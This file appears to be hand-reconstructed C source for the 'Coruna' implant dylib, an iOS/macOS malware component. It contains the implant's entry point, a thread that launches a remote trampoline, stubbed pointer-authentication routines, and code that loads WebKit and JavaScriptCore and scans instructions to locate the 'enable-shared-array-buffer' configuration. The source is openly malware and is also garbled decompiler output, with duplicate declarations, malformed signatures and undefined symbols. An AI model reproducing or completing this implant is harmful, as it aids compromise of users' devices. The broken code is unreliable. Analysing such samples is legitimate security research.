/*
 * Coruna implant dylib (implant49c4) — hand-reconstructed native C
 *
 * Mach-O export _start: implant context, IO dispatch, dylib section resolve.
 *
 * Rebuild: hand-reconstructed — skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}


typedef void (*coruna_implant_trampoline_fn)(void);

static inline uint64_t coruna_u64_pack(uint32_t hi, uint32_t lo)
{
    return ((uint64_t)hi << 32) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack71(uint64_t hi7, uint8_t lo)
{
    return (hi7 << 8) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack14(uint8_t hi, uint64_t lo)
{
    return ((uint64_t)hi << 32) | (uint32_t)lo;
}

static inline uint64_t coruna_cat(uint64_t hi, uint64_t lo)
{
    return (hi << 32) | (uint32_t)lo;
}



/* Implant runtime constants (from Mach-O image) */
static uint64_t k_implant_branch_mask;
static uint64_t k_implant_ctx_slot_primary;
static uint64_t k_implant_insn_word_e59c = 0x0000000000000000ULL;
static uint64_t k_implant_insn_word_e5a4 = 0x0000000000000000ULL;
static uint64_t k_implant_insn_word_e5ac = 0x0000000000000000ULL;
static uint64_t k_implant_scan_magic_a = 0x0000010000000080ULL;
static uint64_t k_implant_insn_word_eaf8 = 0x0000002000000010ULL;
static uint64_t k_implant_scan_magic_b = 0x0000000100000701ULL;
static uint64_t k_implant_reloc_word_a = 0x0000020000000001ULL;
static uint64_t k_implant_rodata_word_eb88 = 0x0013000000000000ULL;
static uint64_t k_implant_reloc_word_b = 0x0000000000000001ULL;
static uint64_t k_implant_rodata_word_eb98 = 0x0000000040000000ULL;
static uint32_t k_implant_float_const_pack = 0x3c23d70a;
static uint32_t k_implant_float_const_01 = 0x3dcccccd;
static uint32_t k_implant_rodata_word_eba8 = 0x4e6e6b28;
static uint32_t k_implant_rodata_word_ebac = 0x3e4ccccd;
static uint64_t k_implant_rodata_word_ec10 = 0x0000002000000000ULL;
static uint64_t k_implant_rodata_word_ec18 = 0x0000000042000000ULL;
static uint64_t k_implant_rodata_word_ec60 = 0x4847464544434241ULL;
static uint64_t k_implant_section_count_hint = 0x0000000000000004ULL;
static uint64_t k_implant_symbol_count_hint = 0x0000000000000012ULL;
static uint64_t k_implant_bss_slot_10870 = 0x0000000000000000ULL;
static uint64_t k_implant_bss_slot_10890 = 0x0000000000000000ULL;
static uint64_t k_implant_bss_slot_108b0 = 0x0000000000000000ULL;
static uint64_t k_implant_bss_slot_108e0 = 0x0000000000000000ULL;
static uint64_t k_implant_bss_slot_10910 = 0x0000000000000000ULL;
static uint64_t k_implant_bss_slot_10968 = 0x0000000000000000ULL;
static uint64_t k_implant_bss_slot_10998 = 0x0000000000000000ULL;
static uint64_t k_implant_md5_mix_word_a = 0xffc003ff9f000000ULL;
static uint64_t k_implant_md5_mix_word_b = 0xf900010090000000ULL;
static uint64_t k_implant_md5_mix_word_c = 0x0000000050000000ULL;
static uint64_t k_implant_md5_mix_word_d = 0x0000000700000023ULL;
static uint64_t k_implant_reloc_tag_a = 0x0000001500000013ULL;
static uint64_t k_implant_reloc_tag_c = 0x0000000200000001ULL;
static uint64_t k_implant_reloc_tag_e = 0x0000000e00000011ULL;
static uint64_t k_implant_map_size_bias = 0x0000000000000018ULL;
static uint64_t k_implant_map_size_page = 0x0000000000000128ULL;
static uint64_t k_implant_map_flags_a = 0x0000000000000001ULL;
static uint64_t k_implant_rodata_slot_a = 0x0000000000000003ULL;
static uint64_t k_implant_rodata_word_ebf0 = 0x0000000000000005ULL;
static uint64_t k_implant_rodata_word_ec00 = 0x0000000000000600ULL;
static uint64_t k_implant_import_slot_23 = 0x0000000000000023ULL;
static uint64_t k_implant_import_slot_24 = 0x0000000000000024ULL;
static uint64_t k_implant_import_slot_25 = 0x0000000000000025ULL;
static uint64_t k_implant_import_slot_26 = 0x0000000000000026ULL;
static uint64_t k_implant_import_slot_27 = 0x0000000000000027ULL;
static uint64_t k_implant_import_slot_28 = 0x0000000000000028ULL;
static uint64_t k_implant_import_slot_29 = 0x0000000000000029ULL;
static uint64_t k_implant_import_slot_2a = 0x000000000000002aULL;
static uint64_t k_implant_import_slot_2b = 0x000000000000002bULL;
static uint64_t k_implant_import_slot_2c = 0x000000000000002cULL;
static uint64_t k_implant_import_slot_2d = 0x000000000000002dULL;
static uint64_t k_implant_import_slot_2e = 0x000000000000002eULL;
static uint64_t k_implant_import_slot_2f = 0x000000000000002fULL;
static uint64_t k_implant_import_slot_30 = 0x0000000000000030ULL;
static uint64_t k_implant_import_slot_31 = 0x0000000000000031ULL;
static void *ptr_implant49c4_fn_10850 = (void *)0x001000000000ccdcULL;
static void *k_implant_nsconcretestackblock_slot = (void *)0x8010000000000002ULL;
static void *k_implant_stack_chk_guard_slot = (void *)0x8010000000000010ULL;
static void *k_implant_stderrp_slot = (void *)0x8010000000000011ULL;
static void *k_implant_dispatch_main_q_slot = (void *)0x8010000000000012ULL;
static void *k_implant_mach_task_self_slot = (void *)0x801000000000002fULL;
static void *PTR_s__OBJC_CLASS___DataClassMigrator_000107a0 = (void *)0x003000000000f6e5ULL;
static void *PTR_s__SSLRecordReadInternal_000107c0 = (void *)0x003000000000f705ULL;
static void *PTR_s__SSLRecordReadInternal_00010800 = (void *)0x003000000000f705ULL;
static void *PTR_s__System_Library_Frameworks_Found_00010678 = (void *)0x001000000000ece7ULL;
static void *PTR_s__System_Library_Frameworks_Found_00010778 = (void *)0x001000000000ece7ULL;
static void *PTR_s__System_Library_Frameworks_Found_00010818 = (void *)0x001000000000ece7ULL;
static void *PTR_s__System_Library_Frameworks_Secur_000107b8 = (void *)0x001000000000f311ULL;
static void *PTR_s__System_Library_Frameworks_Secur_000107d8 = (void *)0x001000000000f311ULL;
static void *PTR_s__System_Library_Frameworks_Secur_000107f8 = (void *)0x001000000000f311ULL;
static void *PTR_s__System_Library_PrivateFramework_00010758 = (void *)0x001000000000f5e4ULL;
static void *PTR_s__System_Library_PrivateFramework_00010798 = (void *)0x001000000000f69dULL;
static void *PTR_s__System_Library_PrivateFramework_00010838 = (void *)0x001000000000f69dULL;
static void *PTR_s___AUTH_00010948 = (void *)0x001000000000ff16ULL;
static void *PTR_s___AUTH_CONST_00010940 = (void *)0x001000000000ff09ULL;
static void *PTR_s___DATA_00010950 = (void *)0x001000000000f893ULL;
static void *PTR_s___DATA_CONST_00010958 = (void *)0x001000000000ff1dULL;
static void *PTR_s___DATA_DIRTY_00010960 = (void *)0x003000000000ff2aULL;
static void *PTR_s___ZGVZN7WebCore24FloatingPointEn_00010760 = (void *)0x003000000000f620ULL;
static void *PTR_s_____NSExtensionContextInternalCl_00010820 = (void *)0x003000000000f748ULL;
static void *PTR_s_____NSExtensionContextVendorClas_00010680 = (void *)0x004000000000f4deULL;
static void *PTR_s__deviceStateChanged__000106a0 = (void *)0x004000000000f50dULL;
static void *PTR_s__rng_00010740 = (void *)0x003000000000f5dfULL;
static void *PTR_s__softLinkEXGetExtensionContextIn_00010780 = (void *)0x003000000000f671ULL;
static void *PTR_s__tls_handshake_init_pending_ciph_000107e0 = (void *)0x003000000000f71cULL;
static void *PTR_s__usr_lib_system_libsystem_c_dyli_00010738 = (void *)0x001000000000f5bdULL;
static void *PTR_s_dataClassMigratorForBundleAtPath_00010840 = (void *)0x002000000000f779ULL;
static void *PTR_s_performSelectorOnMainThread_with_00010700 = (void *)0x004000000000f55bULL;
static void *PTR_s_setObject_forKeyedSubscript__00010720 = (void *)0x003000000000f591ULL;
static void *PTR_s_stringByEvaluatingJavaScriptFrom_000106c0 = (void *)0x004000000000f522ULL;
static void *PTR_s_valueForKeyPath__000106e0 = (void *)0x004000000000f54aULL;


void _start(long handle)
{
  uint u;
  int err;
  unsigned long size;
  uint64_t *ptr;
  unsigned long version;
  uint32_t scratch;
  uint64_t bootargs;
  uint32_t thread_attr;
  uint64_t host_info;
  long serial_buf;
  void *action;
  pthread_t block_ctx;
  pthread_attr_t stack_guard;
  long sa_saved;
  
  sa_saved = *(long *)k_implant_stack_chk_guard_slot;
  version = 0xad00b;
  if (handle == 0) {
    size = 0xad001;
  }
  else {
    serial_buf = 0;
    size = coruna_implant49c4_via_pthread_rwlock_destroy(&serial_buf,handle);
    if ((int)size == 0) {
      host_info = 0;
      thread_attr = 0;
      size = (**(void (**)(serial_buf + 0x18))(serial_buf,0x70003,&host_info,&thread_attr);
      if ((int)size == 0) {
        bootargs = 0;
        scratch = 0;
        size = (**(void (**)(serial_buf + 0x18))(serial_buf,0xa0002,&bootargs,&scratch);
        if ((int)size == 0) {
          ptr = _calloc(1,0x20);
          if (ptr == (uint64_t *)0x0) {
            size = 0xad009;
          }
          else if (*(long *)(handle + 0x78) == 0) {
            size = 0xad014;
          }
          else {
            ptr[3] = handle;
            *ptr = host_info;
            ptr[1] = bootargs;
            *(uint32_t *)(ptr + 2) = scratch;
            stack_guard.__opaque[0x20] = '\0';
            stack_guard.__opaque[0x21] = '\0';
            stack_guard.__opaque[0x22] = '\0';
            stack_guard.__opaque[0x23] = '\0';
            stack_guard.__opaque[0x24] = '\0';
            stack_guard.__opaque[0x25] = '\0';
            stack_guard.__opaque[0x26] = '\0';
            stack_guard.__opaque[0x27] = '\0';
            stack_guard.__opaque[0x18] = '\0';
            stack_guard.__opaque[0x19] = '\0';
            stack_guard.__opaque[0x1a] = '\0';
            stack_guard.__opaque[0x1b] = '\0';
            stack_guard.__opaque[0x1c] = '\0';
            stack_guard.__opaque[0x1d] = '\0';
            stack_guard.__opaque[0x1e] = '\0';
            stack_guard.__opaque[0x1f] = '\0';
            stack_guard.__opaque[0x30] = '\0';
            stack_guard.__opaque[0x31] = '\0';
            stack_guard.__opaque[0x32] = '\0';
            stack_guard.__opaque[0x33] = '\0';
            stack_guard.__opaque[0x34] = '\0';
            stack_guard.__opaque[0x35] = '\0';
            stack_guard.__opaque[0x36] = '\0';
            stack_guard.__opaque[0x37] = '\0';
            stack_guard.__opaque[0x28] = '\0';
            stack_guard.__opaque[0x29] = '\0';
            stack_guard.__opaque[0x2a] = '\0';
            stack_guard.__opaque[0x2b] = '\0';
            stack_guard.__opaque[0x2c] = '\0';
            stack_guard.__opaque[0x2d] = '\0';
            stack_guard.__opaque[0x2e] = '\0';
            stack_guard.__opaque[0x2f] = '\0';
            stack_guard.__opaque[0] = '\0';
            stack_guard.__opaque[1] = '\0';
            stack_guard.__opaque[2] = '\0';
            stack_guard.__opaque[3] = '\0';
            stack_guard.__opaque[4] = '\0';
            stack_guard.__opaque[5] = '\0';
            stack_guard.__opaque[6] = '\0';
            stack_guard.__opaque[7] = '\0';
            stack_guard.__sig = 0;
            stack_guard.__opaque[0x10] = '\0';
            stack_guard.__opaque[0x11] = '\0';
            stack_guard.__opaque[0x12] = '\0';
            stack_guard.__opaque[0x13] = '\0';
            stack_guard.__opaque[0x14] = '\0';
            stack_guard.__opaque[0x15] = '\0';
            stack_guard.__opaque[0x16] = '\0';
            stack_guard.__opaque[0x17] = '\0';
            stack_guard.__opaque[8] = '\0';
            stack_guard.__opaque[9] = '\0';
            stack_guard.__opaque[10] = '\0';
            stack_guard.__opaque[0xb] = '\0';
            stack_guard.__opaque[0xc] = '\0';
            stack_guard.__opaque[0xd] = '\0';
            stack_guard.__opaque[0xe] = '\0';
            stack_guard.__opaque[0xf] = '\0';
            block_ctx = (pthread_t)0x0;
            err = _pthread_attr_init(&stack_guard);
            size = version;
            if (err == 0) {
              err = _pthread_attr_setdetachstate(&stack_guard,1);
              if ((err == 0) &&
                 (err = _pthread_create(&block_ctx,&stack_guard,(void **)coruna_nop_stub,ptr),
                 err == 0)) {
                action = (void *)0x0;
                err = _pthread_join(block_ctx,&action);
                u = (uint)action;
                if (err != 0) {
                  u = 0xad00b;
                }
                version = (unsigned long)u;
              }
              _pthread_attr_destroy(&stack_guard);
              size = version;
            }
            _free(ptr);
          }
        }
      }
    }
  }
  if (*(long *)k_implant_stack_chk_guard_slot == sa_saved) {
    return;
  }
  ___stack_chk_fail(size);
}





long coruna_nop_stub(void)
{
  uint u;
  uint size;
  
  size = coruna_implant_remote_trampoline();
  u = 0;
  if ((size | 0x80000000) != 0x80000000) {
    u = size | 0x80000000;
  }
  return (long)(int)u;
}





void coruna_pacia(void)
{
  return;
}





void coruna_pacda(void)
{
  return;
}





void coruna_pacib(void)
{
  return;
}





void coruna_pacdb(void)
{
  return;
}
uint64_t coruna_return_zero_41a8(void)
{
  return 0;
}





void coruna_implant_indirect_call0(void (*indirect_target)
{
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_b(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[12];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_c(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[4];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_2(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}
void coruna_implant49c4_via_memcpy_7be8_8df0(uint64_t val)
{
  uint64_t u;
  uint8_t *ptr;
  uint64_t size;
  void *ptr;
  long handle;
  uint64_t *scratch;
  uint64_t *bootargs;
  uint64_t *thread_attr;
  uint64_t *host_info;
  uint64_t *serial_buf;
  uint64_t *action;
  void *block_ctx;
  void *stack_guard;
  void *sa_saved;
  void *sa_new;
  void *path_buf;
  void *tmp_buf;
  uint32_t region[2];
  uint8_t plist[24];
  uint32_t url_buf;
  uint8_t json_buf[24];
  uint32_t frame;
  uint8_t work[24];
  uint32_t cache;
  long cache_20 [4];
  
  cache_20[3] = *(long *)k_implant_stack_chk_guard_slot;
  sa_new = operator_new(0x1c0);
  ptr = (void *)((long)sa_new + 0x1c0);
  tmp_buf = ptr;
  _memcpy(sa_new,&k_implant_section_count_hint,0x1c0);
  region[0] = 0;
  path_buf = ptr;
  coruna_memcpy_7be8_8df0(plist,&sa_new);
  block_ctx = operator_new(0x220);
  ptr = (void *)((long)block_ctx + 0x220);
  sa_saved = ptr;
  _memcpy(block_ctx,&k_implant_symbol_count_hint,0x220);
  url_buf = 1;
  stack_guard = ptr;
  coruna_memcpy_7be8_8df0(json_buf,&block_ctx);
  host_info = operator_new(0x20);
  size = k_implant_rodata_word_00010688;
  ptr = PTR_s_____NSExtensionContextVendorClas_00010680;
  u = k_implant_import_slot_23;
  serial_buf = host_info + 4;
  host_info[1] = PTR_s__System_Library_Frameworks_Found_00010678;
  *host_info = u;
  host_info[3] = size;
  host_info[2] = ptr;
  frame = 2;
  action = serial_buf;
  coruna_memcpy_7be8_8df0(work,&host_info);
  scratch = operator_new(0xa0);
  size = k_implant_rodata_word_00010708;
  ptr = PTR_s_performSelectorOnMainThread_with_00010700;
  u = k_implant_import_slot_27;
  bootargs = scratch + 0x14;
  scratch[0xd] = k_implant_rodata_word_000106f8;
  scratch[0xc] = u;
  scratch[0xf] = size;
  scratch[0xe] = ptr;
  size = k_implant_rodata_word_00010728;
  ptr = PTR_s_setObject_forKeyedSubscript__00010720;
  u = k_implant_import_slot_28;
  scratch[0x11] = k_implant_rodata_word_00010718;
  scratch[0x10] = u;
  scratch[0x13] = size;
  scratch[0x12] = ptr;
  size = k_implant_rodata_word_000106c8;
  ptr = PTR_s_stringByEvaluatingJavaScriptFrom_000106c0;
  u = k_implant_import_slot_25;
  scratch[5] = k_implant_rodata_word_000106b8;
  scratch[4] = u;
  scratch[7] = size;
  scratch[6] = ptr;
  size = k_implant_rodata_word_000106e8;
  ptr = PTR_s_valueForKeyPath__000106e0;
  u = k_implant_import_slot_26;
  scratch[9] = k_implant_rodata_word_000106d8;
  scratch[8] = u;
  scratch[0xb] = size;
  scratch[10] = ptr;
  size = k_implant_rodata_word_000106a8;
  ptr = PTR_s__deviceStateChanged__000106a0;
  u = k_implant_import_slot_24;
  scratch[1] = k_implant_rodata_word_00010698;
  *scratch = u;
  scratch[3] = size;
  scratch[2] = ptr;
  cache = 3;
  thread_attr = bootargs;
  coruna_memcpy_7be8_8df0(cache_20,&scratch);
  coruna_implant49c4_via_cat(val,region,4);
  handle = 0;
  do {
    ptr = *(void **)((long)cache_20 + handle);
    if (ptr != (void *)0x0) {
      *(void **)((long)cache_20 + handle + 8) = ptr;
      operator_delete(ptr);
    }
    handle = handle + -0x20;
  } while (handle != -0x80);
  if (scratch != (uint64_t *)0x0) {
    bootargs = scratch;
    operator_delete(scratch);
  }
  if (host_info != (uint64_t *)0x0) {
    serial_buf = host_info;
    operator_delete(host_info);
  }
  if (block_ctx != (void *)0x0) {
    stack_guard = block_ctx;
    operator_delete(block_ctx);
  }
  if (sa_new != (void *)0x0) {
    path_buf = sa_new;
    operator_delete(sa_new);
  }
  if (*(long *)k_implant_stack_chk_guard_slot == cache_20[3]) {
    return;
  }
  ___stack_chk_fail();
}





void coruna_implant49c4_via_cat(long *handle,uint *size,long addr_2)
{
  long *ptr;
  uint *ptr;
  uint u;
  unsigned long size;
  unsigned long version;
  long handle;
  long *buf;
  long *str;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  unsigned long unaff_x27;
  uint16_t type_id;
  uint64_t type_id_8;
  
  if (addr_2 != 0) {
    ptr = size + addr_2 * 8;
    ptr = handle + 2;
    do {
      u = *size;
      kind = (unsigned long)u;
      tag = handle[1];
      if (tag == 0) {
fail:
        buf = operator_new(0x30);
        *(uint *)(buf + 2) = u;
        coruna_memcpy_7be8_8df0(buf + 3,size + 2);
        *buf = 0;
        buf[1] = kind;
        if (*(float *)(handle + 4) * (float)tag < (float)(handle[3] + 1) || tag == 0) {
          version = 1;
          if (2 < tag) {
            version = (unsigned long)((tag & tag - 1) != 0);
          }
          version = version | tag << 1;
          tag = (unsigned long)((float)(handle[3] + 1) / *(float *)(handle + 4));
          if (tag <= version) {
            tag = version;
          }
          coruna_implant49c4_via_cat_2(handle,tag);
          tag = handle[1];
          if ((tag & tag - 1) == 0) {
            unaff_x27 = (unsigned long)((int)tag - 1U & u);
          }
          else {
            unaff_x27 = kind;
            if (tag <= kind) {
              version = 0;
              if (tag != 0) {
                version = kind / tag;
              }
              unaff_x27 = kind - version * tag;
            }
          }
        }
        handle = *handle;
        str = *(long **)(handle + unaff_x27 * 8);
        if (str == (long *)0x0) {
          *buf = *ptr;
          *ptr = (long)buf;
          *(long **)(handle + unaff_x27 * 8) = ptr;
          if (*buf != 0) {
            kind = *(unsigned long *)(*buf + 8);
            if ((tag & tag - 1) == 0) {
              kind = kind & tag - 1;
            }
            else if (tag <= kind) {
              version = 0;
              if (tag != 0) {
                version = kind / tag;
              }
              kind = kind - version * tag;
            }
            *(long **)(*handle + kind * 8) = buf;
          }
        }
        else {
          *buf = *str;
          *str = (long)buf;
        }
        handle[3] = handle[3] + 1;
      }
      else {
        type_id_8 = coruna_cat(POPCOUNT((char)(tag >> 0x38)),
                          coruna_cat(POPCOUNT((char)(tag >> 0x30)),
                                   coruna_cat(POPCOUNT((char)(tag >> 0x28)),
                                            coruna_u64_pack14((POPCOUNT((char)(tag >> 0x20))), (coruna_cat(POPCOUNT((char))(tag >> 0x18)),
                                                              coruna_cat(POPCOUNT((char)(tag >>
                                                                                      0x10)),
                                                                       coruna_cat(POPCOUNT((char)(
                                                  tag >> 8)),POPCOUNT((char)tag))))))));
        type_id = NEON_uaddlv(type_id_8,1);
        version = coruna_cat((int6)((unsigned long)type_id_8 >> 0x10),type_id) & 0xffffffff;
        if (version < 2) {
          unaff_x27 = (unsigned long)((int)tag - 1U & u);
        }
        else {
          unaff_x27 = kind;
          if (tag <= kind) {
            port = 0;
            if (tag != 0) {
              port = kind / tag;
            }
            unaff_x27 = kind - port * tag;
          }
        }
        buf = *(long **)(*handle + unaff_x27 * 8);
        if (buf == (long *)0x0) goto fail;
        do {
          buf = (long *)*buf;
          if (buf == (long *)0x0) goto fail;
          port = buf[1];
          if (port != kind) {
            if (version < 2) {
              port = port & tag - 1;
            }
            else if (tag <= port) {
              size = 0;
              if (tag != 0) {
                size = port / tag;
              }
              port = port - size * tag;
            }
            if (port != unaff_x27) goto fail;
          }
        } while (*(uint *)(buf + 2) != u);
      }
      size = size + 8;
    } while (size != ptr);
  }
  return;
}
void coruna_implant49c4_residual_52(uint64_t *val)
{
  uint64_t u;
  uint64_t size;
  uint64_t version;
  uint64_t *ptr;
  
  ptr = operator_new(0x40);
  version = k_implant_fixup_chain_0000eb58;
  size = k_implant_reloc_tag_a;
  u = k_implant_md5_mix_word_d;
  ptr[1] = k_implant_slot_0000eb48;
  *ptr = u;
  ptr[3] = version;
  ptr[2] = size;
  version = k_implant_fixup_chain_0000eb78;
  size = k_implant_reloc_tag_e;
  u = k_implant_reloc_tag_c;
  ptr[5] = k_implant_fixup_chain_0000eb68;
  ptr[4] = u;
  ptr[7] = version;
  ptr[6] = size;
  coruna_implant49c4_via_implant41e4_residual_61(val,*val,ptr,ptr + 8);
  operator_delete(ptr);
  return;
}





void * coruna_implant49c4_via_implant41e4_residual_61(long *handle,void *ctx,uint32_t *size,uint32_t *flags_2)
{
  unsigned long u;
  uint32_t *ptr;
  size_t ls3;
  uint32_t *buf;
  long handle;
  uint32_t *str;
  unsigned long size;
  uint32_t *copy;
  long addr;
  long off;
  void *scratch;
  uint32_t *bootargs;
  uint32_t *thread_attr;
  void *host_info;
  long *serial_buf;
  
  if (0 < (long)flags_2 - (long)size) {
    addr = (long)flags_2 - (long)size >> 2;
    buf = (uint32_t *)handle[1];
    if (handle[2] - (long)buf >> 2 < addr) {
      off = *handle;
      u = addr + ((long)buf - off >> 2);
      if (u >> 0x3e != 0) {
        coruna_abort_601c();
fail:
        coruna_abort();
      }
      serial_buf = handle + 2;
      handle = handle[2] - off;
      size = handle >> 1;
      if (u <= size) {
        u = size;
      }
      if (0x1ffffffffffffffe < (unsigned long)(handle >> 2)) {
        u = 0x3fffffffffffffff;
      }
      if (u == 0) {
        scratch = (void *)0x0;
      }
      else {
        if (u >> 0x3e != 0) goto fail;
        scratch = operator_new(u << 2);
      }
      bootargs = (uint32_t *)((long)scratch + ((long)ctx - off >> 2) * 4);
      host_info = (void *)((long)scratch + u * 4);
      thread_attr = bootargs + addr;
      addr = addr << 2;
      buf = bootargs;
      do {
        *buf = *size;
        addr = addr + -4;
        buf = buf + 1;
        size = size + 1;
      } while (addr != 0);
      ctx = (void *)coruna_implant41e4_residual_61(handle,&scratch,ctx);
      if ((long)thread_attr - (long)bootargs != 0) {
        thread_attr = thread_attr + (((long)thread_attr - (long)bootargs) - 4U >> 2 ^ 0xffffffffffffffff);
      }
      if (scratch != (void *)0x0) {
        operator_delete(scratch);
      }
    }
    else {
      off = (long)buf - (long)ctx >> 2;
      str = buf;
      if (off < addr) {
        for (copy = size + off; copy != flags_2; copy = copy + 1) {
          *str = *copy;
          str = str + 1;
        }
        handle[1] = (long)str;
        flags_2 = size + off;
        if ((long)buf - (long)ctx < 1) {
          return ctx;
        }
      }
      ls3 = (long)str - (long)((long)ctx + addr * 4);
      ptr = str;
      for (copy = str + -addr; copy < buf; copy = copy + 1) {
        *ptr = *copy;
        ptr = ptr + 1;
      }
      handle[1] = (long)ptr;
      if (ls3 != 0) {
        _memmove(str + -((long)ls3 >> 2),ctx,ls3);
      }
      if ((long)flags_2 - (long)size != 0) {
        _memmove(ctx,size,(long)flags_2 - (long)size);
      }
    }
  }
  return ctx;
}





void coruna_sysctlbyname(void)
{
  int err;
  char *ptr;
  size_t scratch;
  char bootargs [40];
  long thread_attr;
  
  thread_attr = *(long *)k_implant_stack_chk_guard_slot;
  bootargs[8] = '\0';
  bootargs[9] = '\0';
  bootargs[10] = '\0';
  bootargs[0xb] = '\0';
  bootargs[0xc] = '\0';
  bootargs[0xd] = '\0';
  bootargs[0xe] = '\0';
  bootargs[0xf] = '\0';
  bootargs[0] = '\0';
  bootargs[1] = '\0';
  bootargs[2] = '\0';
  bootargs[3] = '\0';
  bootargs[4] = '\0';
  bootargs[5] = '\0';
  bootargs[6] = '\0';
  bootargs[7] = '\0';
  bootargs[0x18] = '\0';
  bootargs[0x19] = '\0';
  bootargs[0x1a] = '\0';
  bootargs[0x1b] = '\0';
  bootargs[0x1c] = '\0';
  bootargs[0x1d] = '\0';
  bootargs[0x1e] = '\0';
  bootargs[0x1f] = '\0';
  bootargs[0x10] = '\0';
  bootargs[0x11] = '\0';
  bootargs[0x12] = '\0';
  bootargs[0x13] = '\0';
  bootargs[0x14] = '\0';
  bootargs[0x15] = '\0';
  bootargs[0x16] = '\0';
  bootargs[0x17] = '\0';
  scratch = 0x20;
  err = _sysctlbyname("kern.osversion",bootargs,&scratch,(void *)0x0,0);
  if (err == -1) {
    ptr = (char *)0x0;
  }
  else {
    ptr = _strdup(bootargs);
  }
  if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(ptr);
}
uint64_t coruna_load_javascriptcore(long *handle,uint64_t val)
{
  unsigned long u;
  uint size;
  uint version;
  uint port;
  bool err;
  int err;
  uint64_t *ptr;
  char *ptr;
  uint64_t tag;
  uint *buf;
  long handle;
  uint64_t *str;
  uint64_t *copy;
  void *ptr;
  long addr;
  long off;
  uint32_t *data;
  unsigned long kind;
  uint32_t *obj;
  void *buf;
  uint32_t *block;
  size_t ls22;
  uint64_t *entry;
  long *str;
  long base;
  uint type_id;
  uint64_t type_id_8;
  int status;
  uint32_t scratch;
  uint32_t scratch;
  char *bootargs;
  char *thread_attr;
  long host_info;
  uint32_t serial_buf;
  uint32_t bootargs;
  char *action;
  char *block_ctx;
  uint64_t thread_attr;
  uint32_t stack_guard;
  uint32_t host_info;
  uint64_t serial_buf;
  uint64_t sa_saved;
  uint64_t action;
  uint32_t sa_new;
  uint32_t block_ctx;
  char *path_buf;
  uint64_t tmp_buf;
  long region;
  long plist;
  
  plist = *(long *)k_implant_stack_chk_guard_slot;
  ptr = operator_new(0xa0);
  ptr[4] = 0;
  ptr[3] = 0;
  ptr[8] = 0;
  ptr[7] = 0;
  copy = ptr + 5;
  ptr[6] = 0;
  *copy = 0;
  *(uint32_t *)(ptr + 9) = 0x3f800000;
  ptr[0xd] = 0;
  ptr[0xc] = 0;
  entry = ptr + 10;
  ptr[0xb] = 0;
  *entry = 0;
  *(uint32_t *)(ptr + 0xe) = 0x3f800000;
  str = ptr + 0xf;
  ptr[0x10] = 0;
  *str = 0;
  ptr[0x12] = 0;
  ptr[0x11] = 0;
  *(uint32_t *)(ptr + 0x13) = 0x3f800000;
  *ptr = val;
  ptr = _strdup((char *)*handle);
  ptr[2] = ptr;
  tag = coruna_sysctlbyname();
  ptr[1] = tag;
  coruna_implant49c4_via_memcpy_7be8_8df0_2(entry);
  coruna_implant49c4_via_memcpy_7be8_8df0(str);
  err = coruna_implant49c4_via_implant6dec_residual_82(entry,copy);
  if ((err == 0) || (err = coruna_implant49c4_via_implant6dec_residual_82(str,copy), err == 0)) {
    err = false;
  }
  else {
    base = 0xffff1102888122;
    buf = (uint *)coruna_dlclose_ccdc("/System/Library/Frameworks/WebKit.framework/WebKit",
                                   "_WebContentServiceInitializer");
    handle = coruna_dlclose_ccdc("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore",
                          "_g_config");
    region = 0xffff1102888122;
    if ((buf != (uint *)0x0) && (region = 0xffff1102888122, handle != 0)) {
      type_id = 0;
      port = *buf;
      do {
        version = buf[1];
        region = 0xffff1102888122;
        if ((port & 0x9f000000) == 0x90000000) {
          size = buf[4];
          region = 0xffff1102888122;
          if ((version & 0xffc00000) == 0x91000000 && (size & 0xff000000) == 0x35000000) {
            err = _strcmp((char *)(((unsigned long)(port >> 0x11 & 0x3000) |
                                     (unsigned long)(port >> 5 & 0x7ffff) << 0xe) +
                                     ((unsigned long)(buf + 1) & 0xfffffffffffff000) |
                                    (unsigned long)(version >> 10) & 0xfff),"enable-shared-array-buffer");
            region = 0xffff1102888122;
            if (err == 0) {
              off = 0;
              addr = 0xffff1102888122;
              do {
                port = *(uint *)((long)(buf + 1) + off + ((unsigned long)(size >> 5) & 0x7ffff) * 4
                                 );
                region = handle + ((unsigned long)(port >> 10) & 0xfff);
                if (port >> 0x16 != 0xe4) {
                  region = addr;
                }
                off = off + 4;
                addr = region;
              } while (off != 0x28);
            }
          }
        }
      } while ((type_id < 0x31) &&
              (type_id = type_id + 1, buf = buf + 1, port = version,
              region == 0xffff1102888122));
    }
    sa_new = 3;
    path_buf = "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore";
    tmp_buf = 0;
    str = (uint64_t *)coruna_implant41e4_via_cat_4(copy,&sa_new);
    str[1] = path_buf;
    *str = coruna_u64_pack((block_ctx), (sa_new));
    str[3] = region;
    str[2] = tmp_buf;
    stack_guard = 1;
    sa_saved = 0;
    action = 0;
    serial_buf = 0;
    str = (uint64_t *)coruna_implant41e4_via_cat_4(copy,&stack_guard);
    str[1] = serial_buf;
    *str = coruna_u64_pack((host_info), (stack_guard));
    str[3] = action;
    str[2] = sa_saved;
    serial_buf = 2;
    action = "/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation";
